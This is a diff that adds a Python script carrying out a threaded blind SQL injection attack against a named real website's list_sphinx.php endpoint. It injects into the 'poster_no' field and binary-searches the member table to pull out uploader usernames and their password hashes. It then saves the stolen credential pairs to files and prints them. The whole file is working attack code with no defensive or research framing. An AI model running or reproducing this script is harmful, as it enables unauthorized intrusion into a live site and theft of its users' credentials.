@@ -1,0 +1,171 @@
+import requests,re,sys,os,threading,time
+url = "http://sharebox.co.kr/storage/list_sphinx.php"
+wordlist = "0123456789abcdef"
+namelist = "0123456789abcdefghijklmnopqrstuvwxyz"
+def check(payload):
+    global TIMES
+    data = {
+    'section':'MVO',
+    'search_value':'',
+    'search_value_sub':'',
+    'start':0,
+    'list_scale':1,
+    'tab':'',
+    'poster_no':"9' %s -- -"%payload,
+    'poster_sort':'asc'
+        }
+    for i in range(5):
+        try:
+            #sys.stdout.write("[INFO] Trie %s times. Payload: %s\n"%(i+1,payload))
+            req = session.post(url,data=data)
+            TIMES += 1
+            res = req.content
+            if res.find(b"wifi_off") >0:
+                return True
+            elif res.find(b"wifi_on") >0:
+                return False
+            else:
+                continue
+        except Exception as e:
+            sys.stdout.write("[ERROR] Trie %s times. Payload: %s\n"%(i+1,payload))
+            #print(e)
+            continue
+    else:
+        return False
+
+def inject():
+    global TIMES,START_TIME,LIMIT,SUCCESS
+    while True:
+        LIMIT += 1
+        limit = LIMIT
+        """sys.stdout.write("[INFO] Limit-{limit}-Start. Request: {req}. Ok: {ok}\n".format(
+            limit=limit,
+            req=TIMES,
+            #reqAvg=round((time.time()-START_TIME)/TIMES,2),
+            ok=SUCCESS,
+            ))"""
+        userFile = "user/%s.txt"%limit
+        if os.path.isfile(userFile):
+            line = open(userFile,'r').read().strip()
+            user = line.split("\t")
+            if len(user) == 2:
+                if len(user[1]) == 16:
+                    if check("and (select count(1) from _member where userid='{0}' and userpw='{1}')>0".format(user[0],user[1])):
+                        SUCCESS += 1
+                        sys.stdout.write("[SUCCESS] Limit-{limit}. Request: {req}. RequestAVG: {reqAvg}. Ok: {ok}. OkPerTime: {okPerTime}. OkPerReq: {okPerReq}. {userid}:{userpw}\n".format(
+                            limit=limit,
+                            req=TIMES,
+                            reqAvg=round((time.time()-START_TIME)/TIMES,2),
+                            ok=SUCCESS,
+                            okPerTime=int((time.time()-START_TIME)/SUCCESS),
+                            okPerReq=int(TIMES/SUCCESS),
+                            userid=user[0],
+                            userpw=user[1]
+                            ))
+                        continue
+        open(userFile,'w').write('')
+        
+        userpw = ""
+        userid = ""
+        nameLenStart = 0
+        nameLenEnd = 16
+        nameLen = 0
+        while True:
+            #print("nameLenStart",nameLenStart,"nameLenEnd",nameLenEnd,"nameLen",nameLen)
+            if (nameLenEnd-nameLenStart==1):
+                if check("and (select length(userid) from _member where flag_uploader='1' order by no asc limit {0},1)={1}".format(limit,nameLenEnd)):
+                    nameLen = nameLenEnd
+                    break
+                else:
+                    nameLen = nameLenStart
+                    break
+            nameLen = int((nameLenEnd+nameLenStart)/2)
+            if check("and (select length(userid) from _member where flag_uploader='1' order by no asc limit {0},1)>{1}".format(limit,nameLen)):
+                nameLenStart = nameLen+1
+            else:
+                nameLenEnd = nameLen
+
+        
+        #sys.stdout.write("[SUCCESS] %s.Limit: %s.\n"%(nameLen,limit))
+        for i in range(1,nameLen+1):
+            nameStart = 0
+            nameEnd = len(namelist)-1
+            namePos = 0
+            while (nameStart<=nameEnd):
+                #print("nameStart",nameStart,"nameEnd",nameEnd,"namePos",namePos)
+                if(nameEnd-nameStart==1):
+                    if check("and (select substring(userid,{0},1) from _member where flag_uploader='1' order by no asc  limit {1},1)='{2}'".format(i,limit,namelist[nameEnd])):
+                        namePos = nameEnd
+                        break
+                    else:
+                        namePos = nameStart
+                        break
+                elif(nameStart == nameEnd):
+                    namePos = nameStart
+                    break
+                namePos = int((nameEnd + nameStart) / 2)
+                if check("and (select substring(userid,{0},1) from _member where  flag_uploader='1' order by no asc limit {1},1)>'{2}'".format(i,limit,namelist[namePos])):
+                    nameStart = namePos + 1
+                else:
+                    nameEnd = namePos
+            userid += namelist[namePos]
+        open(userFile,'a').write("%s\t"%userid)
+        sys.stdout.write("[SUCCESS] Limit-{limit}-GetUser. Request: {req}. Request_AVG: {reqAvg}. Ok: {ok}. {userid}\n".format(
+            limit=limit,
+            req=TIMES,
+            reqAvg=round((time.time()-START_TIME)/TIMES,2),
+            ok=SUCCESS,
+            userid=userid,
+            ))
+        
+        for i in range(1,17):
+            s=0
+            t=len(wordlist)-1
+            while (s<=t):
+                if (t-s==1):
+                    if check("and (select substring(userpw,{0},1) from _member where  userid='{1}')='{2}'".format(i,userid,wordlist[t])):
+                        m=t
+                        break
+                    else:
+                        m=s
+                        break
+                elif(t == s):
+                    m = s
+                    break
+                m=int((s+t)/2)
+                if check("and (select substring(userpw,{0},1) from _member where  userid='{1}')>'{2}'".format(i,userid,wordlist[m])):
+                    s=m+1
+                    #print(wordlist[s]+":"+wordlist[t])
+                else:
+                    t=m
+                    #print(wordlist[s]+":"+wordlist[t])
+            userpw += wordlist[m]
+            open(userFile,'a').write(wordlist[m])
+        SUCCESS += 1
+        sys.stdout.write("[SUCCESS] Limit-{limit}. Request: {req}. RequestAVG: {reqAvg}. Ok: {ok}. OkPerTime: {okPerTime}. OkPerReq: {okPerReq}. UseTime: {useTime}. {userid}:{userpw}\n".format(
+            limit=limit,
+            req=TIMES,
+            reqAvg=round((time.time()-START_TIME)/TIMES,2),
+            ok=SUCCESS,
+            okPerTime=int((time.time()-START_TIME)/SUCCESS),
+            okPerReq=int(TIMES/SUCCESS),
+            userid=userid,
+            userpw=userpw,
+            useTime=int(time.time()-START_TIME)
+            ))
+if __name__ == "__main__":
+    session = requests.session()
+    #session.proxies = {"http":"http://127.0.0.1:8080"}
+    LIMIT = 0
+    TIMES = 0
+    SUCCESS = 0
+    START_TIME = time.time()
+    
+    ts = []
+    for i in range(100):
+        t = threading.Thread(target=inject)
+        t.setDaemon(True)
+        t.start()
+        ts.append(t)
+    for t in ts:
+        t.join()
